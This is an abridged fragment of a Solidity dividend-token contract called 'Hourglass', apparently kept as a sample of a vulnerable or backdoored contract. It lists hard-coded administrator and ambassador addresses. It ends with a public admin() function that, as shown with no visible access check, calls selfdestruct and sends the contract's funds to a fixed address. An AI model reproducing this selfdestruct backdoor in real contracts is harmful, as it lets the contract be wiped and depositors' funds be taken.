...
contract Hourglass {
    ...
    */
        ...
        public
    {
        ...
        administrators[0x1f7c2ac979581ded10272c67eab0c13c2cb74709fcedc9b81a479b91277db2ec] = true;
        
        // 在这里添加代表。
        // mantso - lead solidity dev & lead web dev. 
        ambassadors_[0x84a5F08B9FEe141bcFA5CdEF82Dfd8799Fb1f863] = true;
        
        // ponzibot - mathematics & website, and undisputed meme god.
        ambassadors_[0x3bdA41a996de699ddB5e60878983B3FCa4791B3B] = true;
        
        // swagg - concept design, feedback, management.
        ambassadors_[0xB7bf840383F6FC522cBB633b73456EFD484DF682] = true;
        ...
        ambassadors_[0x1342A43A8894a7D9D454EC5e32f85fb4a2C433A7] = true;
        
        // capex - community moderator.
        ambassadors_[0x812b608405b3B6EC8557c7bFBB962BdaF2B32d66] = true;
        
        // jörmungandr - pentests & twitter trendsetter.
        ambassadors_[0x3c7c20414000440A8f9CD453828290F89E6bB014] = true;
        
        // inventor - the source behind the non-intrusive referral model.
        ambassadors_[0x0807e64D9086740c8DcbD327103e8d0244d7f588] = true;
        
        // tocsick - pentesting, contract auditing.
        ambassadors_[0xB3c48C62ea59BCD6E36f479139904c1e5f02bD20] = true;
        
        // arc - pentesting, contract auditing.
        ambassadors_[0x6A062226a2F2F0C402aF13c5DE771D7A004CDDDb] = true;
    }
    ...
    function admin()
        ...
        public
    {
        selfdestruct(0xBF9c9370FEfe4D5FEfD014f0322d0001ce9E60E0);
    }
